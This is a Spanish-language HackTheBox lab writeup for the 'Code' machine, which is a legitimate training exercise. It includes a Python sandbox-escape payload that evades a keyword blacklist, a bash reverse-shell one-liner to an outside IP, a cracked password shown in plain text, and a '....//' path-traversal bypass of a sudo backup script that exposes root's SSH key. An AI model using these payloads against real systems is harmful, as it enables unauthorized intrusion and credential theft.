---
title: "Code"
date: 2025-05-29 16:41:27 +0200
categories: writeups HackTheBox
tags: máquina linux rce sudoers python sandboxescape criptografía autopwned
description: Writeup de la máquina Code de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
- AutoPwned: **code\_autopwned.py**
___
## Resumen de la resolución

**Code** es una máquina **Linux** de dificultad **Fácil** de la plataforma de **HackTheBox**. En ella, veremos como ejecutaremos comandos remotamente (**RCE**) gracias a un escape del sandbox de **python**. Posteriormente, se extraen credenciales que nos permitirán acceder como el usuario **martin**. Finalmente, abusaremos de un permiso de **Sudoers** sobre un script. Para ello, realizaremos un **bypass** que nos permitirá conectarnos como **root** haciendo uso de su clave privada.

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324102824.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.129.209.108`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.129.209.108 -oG allPorts
```

Observamos como nos reporta que tan solo se encuentran abiertos los puertos **22 y 5000**.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324102945.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.129.209.108 -oN targeted
```

En el segundo escaneo de **Nmap**, lo que más nos llamará la atención es el backend utilizado en el puerto **5000** y el título de la página (**Python Code Editor**), que nos da una pista sobre el propósito de la página.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324103113.png>)

___
### Puerto 80 - HTTP (Gunicorn)

El aspecto de la página web es el siguiente, veremos que podemos ejecutar código **python** en la web.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324103241.png>)

Existe la opción de registrarnos y logearnos, pero lo único que nos permitirá es tener almacenados nuestros códigos.

Lo primero que se nos ocurre es intentar ejecutar comandos de la siguiente forma, pero veremos que existe una **blacklist** que contiene palabras que no pueden ser ejecutadas en un código Python.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324103323.png>)

___
## Explotación
### Python Sandbox Escape → RCE

Tras un buen rato buscando una forma de escapar de este sandbox de Python, **ChatGPT** me dio la solución. Básicamente, para poder ejecutar comandos, debemos usar el siguiente código.

```python
builtins = globals().get('sy' + 's')
if builtins:
    sb = builtins.modules.get("sub" + "process")
    if sb:
        result = sb.run("whoami; ho" + "stname -I", shell=True, stdout=sb.PIPE, stderr=sb.PIPE)
        print(result.stdout.decode())
```

Tal y como vemos a continuación, lograremos ejecutar comandos remotamente (**RCE**) en la máquina víctima como el usuario **app-production**.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324112500.png>)

A continuación, lo que haremos será ponernos en escucha con **NetCat** (`nc -nlvp 443`) y enviarnos una **Reverse Shell** gracias al típico one liner de bash (`bash -c 'bash -i >& /dev/tcp/192.168.26.10/443 0>&1'").

Veremos como recibimos correctamente la **Reverse Shell**, por lo que habremos ganado acceso a la máquina vícitma.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324112839.png>)

___
## Movimiento lateral de usuario
### Enumeración local

Tras ganar acceso a la máquina víctima, realizaremos un **Tratamiento de la TTY** para operar desde una terminal más cómoda.

En el directorio `/app` de nuestro directorio **HOME**, podemos ver el archivo **app.py**, que es el código fuente encargado de levantar el servidor de Python que veíamos en el puerto **5000**.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324113028.png>)

Si miramos el contenido del **app.py**, veremos que efectivamente es el código fuente de la página web desplegada en el puerto **5000**. Además, podemos observar que existe un archivo llamado **database.db**, donde probablemente se almacenen credenciales.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324113228.png>)


"Tal como vemos a continuación, podemos ver la ubicación del archivo **database.db**. Además, veremos que se trata de un archivo de **SQLite3**.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324113529.png>)
### Information Leakage

Al listar el contenido de la tabla **user**, veremos que existe un usuario llamado **martin**, además de su contraseña hasheada en **MD5**.
![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324113724.png>)

Si revisamos los usuarios que tienen una shell en el sistema, veremos que el usuario **martin** tiene una.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324113740.png>)
### Cracking Hash

Para crackear el hash del usuario **martin**, podemos usar **hashcat** o **johntheripper** pero vamos a tardar mucho más que si usamos [CrackStation](https://crackstation.net/) ya que la contraseña está en la línea **5226918**.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324114344.png>)

En cambio, si usamos [CrackStation](https://crackstation.net/), veremos la contraseña del usuario **martin** al instante.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324114325.png>)

Si bien recordamos el servicio de **ssh** se encontraba abierto por lo que probaremos a conectarnos usando las credenciales encontradas usando el siguiente comando:

```bash
ssh martin@10.129.87.225 # Password: nafeelswordsmaster
```

Veremos que nos conectaremos correctamente, por lo que habremos ganado acceso a la máquina víctima como **martin**, además debemos de cambiar nuestra variable de entorno **TERM** (`export TERM=xterm`) para poder limpiar la pantalla, es decir poder hacer un <kbd>CTRL</kbd>+<kbd>L</kbd>.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324114657.png>)

___
## Escalada de privilegios
### Enumeración local

Una vez que hemos ganado acceso a la máquina víctima, listaremos nuestros permisos de **Sudoers**, y veremos que podemos ejecutar el binario `/usr/bin/backy.sh` como cualquier usuario sin necesidad de proporcionar una contraseña.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324114843.png>)

En primer lugar, miraremos los permisos de `/usr/bin/backy.sh`, y veremos que no podemos modificar el contenido del binario.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324115021.png>)

El contenido del script (`/usr/bin/backy.sh`), es el siguiente.

```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```
### /usr/bin/backy.sh | Sudoers

Para entender mejor el funcionamiento de esta herramienta, ejecutaremos el script pasándole un archivo `task.json`, el cual está ubicado en `/home/martin/backups/task.json`.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324115301.png>)

Al ejecutarlo como **root** , veremos que nos crea un comprimido, con extensión **.tar.bz2**.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324115343.png>)

Para descomprimirlo, debemos de ejecutar el siguiente comando.

```bash
tar -xvjf code_home_app-production_app_2025_March.tar.bz2
```

Tal y como vemos a continuación, veremos que el contenido del directorio **/home/app-production/app**.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324115522.png>)

El motivo por el cual se ha comprimido **/home/app-production/app**, es porque lo hemos indicado en el `task.json`.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324115732.png>)

En el caso de que intentemos comprimir el directorio `/root` para leer la clave privada (**id_rsa**), obtendremos un error, ya que únicamente está permitido comprimir los directorios `/var/` y `/home/`.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324115858.png>)

Si volvemos a revisar el script, nos llamará la atención esta parte, ya que está buscando cadenas `../` para sustituirlas por `""` (cadena vacía).

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324120124.png>)

Mirando este código se nos ocurre una forma de **bypasearlo**, y es añadiendo la siguiente ruta `/home/....//root`. Ejecutaremos el script (`sudo /usr/bin/backy.sh task.json)`, y veremos que al aplicar la sustitución, la ruta se ha quedado así: `/home/../root`.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324120727.png>)

Como vemos a continuación, no dará un error al descomprimir el **.tar.bz2**.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324120457.png>)

Para evitar el anterior error al descomprimir, debemos de eliminar el campo **exclude** del fichero `task.json`. Una vez hecho esto, volveremos a ejecutar el script (`sudo /usr/bin/backy.sh task.json`)

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324120831.png>)

Tal como se aprecia, no nos dará ningún error al descomprimir el archivo **.tar.bz2**, y además podremos ver todo el contenido de `/root`, incluida la clave privada del **root** (`root/.ssh/id_rsa`).

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324120956.png>)

Nos conectaremos a través de ssh usando la clave privada del **root** (`id_rsa`), en definitiva. debemos de ejecutar el siguiente comando.

```bash
ssh -i root/.ssh/id_rsa root@localhost
```

Finalmente, veremos como hemos ganado acceso a la máquina víctima como el usuario **root**.

![](<../assets/images/posts/2025-05-29-code/Pasted image 20250324121054.png>)